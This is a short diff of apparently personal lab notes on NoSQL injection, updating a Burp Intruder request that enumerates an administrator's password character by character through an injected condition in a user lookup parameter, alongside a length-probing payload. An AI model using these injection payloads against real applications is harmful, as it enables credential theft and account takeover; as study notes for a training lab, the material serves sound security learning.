@@ -1355,7 +1355,7 @@ Types: synxtax (break the NoSQL query syntax), operator (manipulate queries)
      intruder > GET /user/lookup?user=`administrator' && this.password.length == '§1§`
      sniper | payload 1: number 5-15   
    - enumerate the password
-     intruder >  GET /user/lookup?user=`administrator' %26%26+this.password.length+%3d%3d+'§8§`
+     intruder >  GET /user/lookup?user=`administrator' && this.password[§0§]=='§a§`
      cluster bomb | payload 1: 0-7 | payload 2: a-z
 4. Exploiting NoSQL operator injection to **extract unknown fields**
    - Perform password reset for carlos function
